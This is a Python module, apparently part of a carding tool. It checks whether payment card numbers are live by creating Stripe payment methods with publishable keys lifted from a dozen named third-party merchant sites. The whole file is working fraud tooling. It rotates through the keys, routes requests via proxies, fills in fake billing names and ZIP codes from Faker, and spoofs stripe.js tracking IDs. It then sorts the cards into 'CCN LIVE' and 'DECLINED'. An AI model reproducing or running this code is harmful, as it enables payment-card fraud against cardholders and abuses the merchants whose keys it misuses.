"""
Stripe Multi-Site AUTH Gate - Uses multiple known working Stripe public keys
Provides redundancy by trying multiple merchants' keys
Creates Payment Method to validate card (no charge)
"""

import requests
import random
import time
from typing import Tuple, List
from faker import Faker
from gates.error_types import GatewayErrorType, error_type_from_response


STRIPE_PKS = [
    {
        'name': 'pariyatti',
        'pk': 'pk_live_2T8mSGhZyE3A8I2kToOFE1R9',
        'site': 'pariyatti.org',
    },
    {
        'name': 'cedine',
        'pk': 'pk_live_EBTKmVv5ETto22nV9D6tQsGz00N8YsoHNb',
        'site': 'cedine.org',
    },
    {
        'name': 'saintvinson',
        'pk': 'pk_live_51OhyQ8HIO40pYhlcsp8D7XfGuyDCoJHOG4p3VJjMLnupEmwsB2pwjHN0TVHO29UG0k9lS4g1sZHSq3GnBtGmegmU001n7FlqBX',
        'site': 'saintvinsoneugeneallen.com',
    },
    {
        'name': 'ccfoundation',
        'pk': 'pk_live_51IGkkVAgdYEhlUBFnXi5eN0WC8T5q7yyDOjZfj3wGc93b2MAxq0RvWwOdBdGIl7enL3Lbx27n74TTqElkVqk5fhE00rUuIY5Lp',
        'site': 'ccfoundationorg.com',
    },
    {
        'name': 'silverjeans',
        'pk': 'pk_live_51Iq2wGJFeOqD6VPCutzeAKTNFvzuPPVVQb6bYGIh8zVS43VEVOs9L4qwY0icDhWHnrH9zgqz9aHOckRhqIdy4BtZ00DJftDXvK',
        'site': 'silverjeans.com',
    },
    {
        'name': 'tytyga',
        'pk': 'pk_live_k1PQyC2Ql60ZiciQV16EOQjZ',
        'site': 'tytyga.com',
    },
    {
        'name': 'sop',
        'pk': 'pk_live_51HPdUHEHgVwOi60C2i5pTwpy8ZzkgRj0MZE3ECnKkQBQcRZxiqXYgFpUTPe32GNyij4wEcIJa3XMTVsvpVZX1uYX0096YKJmcv',
        'site': 'sop.org',
    },
    {
        'name': 'mcwe',
        'pk': 'pk_live_518STyXHdVlyaUPj1vrz2dZm88hFfu6FzkiL3MvVOQlcJXbXB4jPhYI1Qjf3pXAz3Ynm5BrwmhMKwG2IwKXaIfH7n00Lx6HzkmV',
        'site': 'mcwe.com',
    },
    {
        'name': 'mixtiles',
        'pk': 'pk_live_518K5YbFvVULeqVgsckCgYuwkpx2wogZjr0H1DKHk4SOtmurl4IMq0g58MGR07lUOiKuX1zdCG5boETAT9QMCMSMT00o0UwHfL3',
        'site': 'mixtiles.com',
    },
    {
        'name': 'readymag',
        'pk': 'pk_live_4WmkUqmpy589CuOX7zOhAnU3',
        'site': 'readymag.com',
    },
    {
        'name': 'dribbble',
        'pk': 'pk_live_9EfFSEE6iTCgHghKqBqnixxR',
        'site': 'dribbble.com',
    },
    {
        'name': 'gumroad',
        'pk': 'pk_live_Db80xIzLPWhKo1byPrnERmym',
        'site': 'gumroad.com',
    },
]

_last_used_idx = 0


def _rotate_pk() -> dict:
    """Rotate through available public keys"""
    global _last_used_idx
    pk_info = STRIPE_PKS[_last_used_idx % len(STRIPE_PKS)]
    _last_used_idx += 1
    return pk_info


def stripe_multi_check(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                       proxy: dict = None) -> Tuple[str, bool]:
    """
    Multi-site Stripe AUTH check via Payment Method creation
    Tries multiple public keys for redundancy
    
    Returns:
        Tuple of (status_message, proxy_alive)
    """
    fake = Faker()
    
    if len(card_yer) == 2:
        card_yer = "20" + card_yer
    
    last_error = None
    last_proxy_alive = False
    any_response_received = False
    
    for pk_info in STRIPE_PKS:
        try:
            result, alive = _try_stripe_pk(card_num, card_mon, card_yer, card_cvc, 
                                           pk_info['pk'], pk_info['name'], fake, proxy)
            
            any_response_received = True
            last_proxy_alive = alive
            
            if 'LIVE' in result or 'APPROVED' in result or 'DECLINED' in result:
                return (result, alive)
            
            last_error = result
            time.sleep(0.3)
            
        except Exception as e:
            last_error = f"Error: {str(e)[:40]}"
            last_proxy_alive = False
            continue
    
    return (last_error or "DECLINED - All sites failed", last_proxy_alive)


def _try_stripe_pk(card_num: str, card_mon: str, card_yer: str, card_cvc: str,
                   stripe_pk: str, site_name: str, fake: Faker, 
                   proxy: dict = None) -> Tuple[str, bool]:
    """Try a specific Stripe public key"""
    
    session = requests.Session()
    if proxy:
        session.proxies = proxy
    
    guid = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-4{random.randint(100, 999):03x}-{random.randint(8000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}"
    muid = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-4{random.randint(100, 999):03x}-{random.randint(8000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}"
    sid = f"{random.randint(10000000, 99999999):08x}-{random.randint(1000, 9999):04x}-4{random.randint(100, 999):04x}-{random.randint(8000, 9999):04x}-{random.randint(100000000000, 999999999999):012x}"
    
    headers = {
        'accept': 'application/json',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': 'https://js.stripe.com',
        'referer': 'https://js.stripe.com/',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36',
    }
    
    data = {
        'type': 'card',
        'card[number]': card_num,
        'card[exp_month]': card_mon,
        'card[exp_year]': card_yer,
        'card[cvc]': card_cvc,
        'billing_details[name]': f"{fake.first_name()} {fake.last_name()}",
        'billing_details[address][postal_code]': fake.zipcode(),
        'guid': guid,
        'muid': muid,
        'sid': sid,
        'payment_user_agent': 'stripe.js/v3',
        'time_on_page': str(random.randint(30000, 90000)),
        'key': stripe_pk,
    }
    
    response = session.post('https://api.stripe.com/v1/payment_methods', 
                           headers=headers, data=data, timeout=20)
    result = response.json()
    
    if 'error' in result:
        error_msg = result['error'].get('message', 'Unknown error')
        error_code = result['error'].get('code', '')
        decline_code = result['error'].get('decline_code', '')
        
        error_type = error_type_from_response(f"{error_code} {decline_code} {error_msg}")
        
        if 'test' in error_msg.lower():
            return (f"DECLINED - Live Mode Test Card [{site_name}]", True)
        if error_code == 'incorrect_cvc':
            return (f"CCN LIVE - Incorrect CVV [{site_name}]", True)
        if error_code == 'invalid_cvc':
            return (f"CCN LIVE - Invalid CVV [{site_name}]", True)
        if error_code == 'expired_card':
            return (f"DECLINED - Expired Card [{site_name}]", True)
        if error_code == 'card_declined':
            if decline_code == 'insufficient_funds':
                return (f"CCN LIVE - Insufficient Funds [{site_name}]", True)
            if decline_code == 'lost_card':
                return (f"DECLINED - Lost Card [{site_name}]", True)
            if decline_code == 'stolen_card':
                return (f"DECLINED - Stolen Card [{site_name}]", True)
            if decline_code == 'do_not_honor':
                return (f"DECLINED - Do Not Honor [{site_name}]", True)
            if decline_code == 'fraudulent':
                return (f"DECLINED - Fraudulent [{site_name}]", True)
            if decline_code == 'generic_decline':
                return (f"DECLINED - Generic Decline [{site_name}]", True)
            return (f"DECLINED - {decline_code or error_msg[:30]} [{site_name}]", True)
        if error_code == 'invalid_number' or 'number' in error_msg.lower():
            return (f"DECLINED - Invalid Card Number [{site_name}]", True)
        if error_code == 'processing_error':
            return (f"DECLINED - Processing Error [{site_name}]", True)
        
        if error_type == GatewayErrorType.CVV_MISMATCH:
            return (f"CCN LIVE - CVV Issue [{site_name}]", True)
        if error_type == GatewayErrorType.INSUFFICIENT_FUNDS:
            return (f"CCN LIVE - Insufficient Funds [{site_name}]", True)
        if error_type == GatewayErrorType.EXPIRED_CARD:
            return (f"DECLINED - Expired Card [{site_name}]", True)
        if error_type == GatewayErrorType.FRAUD_CHECK:
            return (f"DECLINED - Fraud/Risk [{site_name}]", True)
        
        return (f"DECLINED - {error_msg[:40]} [{site_name}]", True)
    
    pm_id = result.get('id')
    if pm_id:
        card_brand = result.get('card', {}).get('brand', 'unknown').upper()
        card_checks = result.get('card', {}).get('checks', {})
        cvc_check = card_checks.get('cvc_check', 'unknown')
        last4 = result.get('card', {}).get('last4', card_num[-4:])
        
        if cvc_check == 'fail':
            return (f"CCN LIVE - {card_brand} ...{last4} CVV Mismatch [{site_name}]", True)
        elif cvc_check == 'pass':
            return (f"CCN LIVE - {card_brand} ...{last4} Tokenized (CVV OK) [{site_name}]", True)
        elif cvc_check == 'unavailable':
            return (f"CCN LIVE - {card_brand} ...{last4} Tokenized (CVV N/A) [{site_name}]", True)
        else:
            return (f"CCN LIVE - {card_brand} ...{last4} Tokenized [{site_name}]", True)
    
    return (f"DECLINED - Tokenization failed [{site_name}]", True)
